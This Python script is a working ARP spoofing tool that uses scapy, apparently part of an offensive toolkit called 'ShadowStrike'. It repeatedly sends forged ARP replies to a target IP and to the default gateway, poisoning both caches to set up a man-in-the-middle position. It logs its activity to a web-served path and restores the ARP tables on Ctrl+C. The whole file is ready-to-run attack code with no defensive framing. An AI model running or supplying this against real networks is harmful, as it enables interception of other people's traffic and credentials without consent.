import scapy.all as scapy
import time
import optparse
import netifaces
import logging
from datetime import datetime

# Disable Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Open the log file for writing and ensure it's in append mode
log_file = open("/var/www/html/ShadowStrike/Logs/spoof_log.txt", "a")

def log_message(message):
    # Get the current time in the format: YYYY-MM-DD HH:MM:SS
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create the log message with timestamp
    log_entry = f"[{timestamp}] {message}"
    
    # Write the log entry to the file
    log_file.write(log_entry + "\n")
    log_file.flush()  # Ensures the message is written immediately

    # Also print the message to the terminal
    print(log_entry)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Specify the target IP Address")
    (options, arguments) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please enter a target IP Address.")
    return options

def get_gateway_ip():
    # Retrieve the default gateway IP address
    gateway_info = netifaces.gateways()
    gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
    return gateway_ip

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = arp_broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    
    if target_mac and spoof_mac:
        # ARP response to poison the target
        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(arp_response, verbose=False)
        
        # ARP response to poison the router/gateway
        arp_response_router = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
        scapy.send(arp_response_router, verbose=False)

        # Log spoofing message with timestamp
        log_message(f"[+] Spoofing target {target_ip} and router {spoof_ip}")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if destination_mac and source_mac:
        # Restore the ARP table with correct info
        arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(arp_response, verbose=False, count=4)

        # Log restore message with timestamp
        log_message(f"[+] Restored ARP table for {destination_ip}")

# Initial log when script starts
log_message("[+] Starting ARP Spoofing...")

options = get_arguments()
router_ip = get_gateway_ip()

try:
    while True:
        spoof(options.target_ip, router_ip)
        time.sleep(2)
except KeyboardInterrupt:
    log_message("[-] Detected CTRL+C ... Restoring ARP tables.")
    restore(options.target_ip, router_ip)
    restore(router_ip, options.target_ip)
    log_message("[+] ARP tables restored. Exiting.")

# Close the log file after use
log_file.close()
